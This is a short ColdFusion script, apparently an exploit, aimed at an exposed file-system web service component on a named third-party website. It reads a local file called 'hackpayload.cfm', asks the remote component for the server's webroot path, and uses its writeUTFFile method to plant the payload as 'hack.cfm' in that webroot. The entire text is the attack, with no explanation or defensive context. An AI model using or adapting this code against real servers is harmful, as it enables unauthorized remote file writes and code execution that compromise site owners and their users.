<cffile action="read" file="#getDirectoryFromPath(getCurrentTemplatePath())#hackpayload.cfm" variable="sHackCode">

<cfset o = createObject("webservice", "http://www.straker.co.nz/shadomx/util/filesystem/shado_filesystem.cfc?wsdl")>
<cfset pathToWebroot = o.getPathToRoot(checkSiteContext=false)>
<cfoutput>#pathToWebroot#</cfoutput>
<cfset b = o.writeUTFFile(file="#pathToWebroot#\hack.cfm", output=sHackCode, charset="UTF-8")>

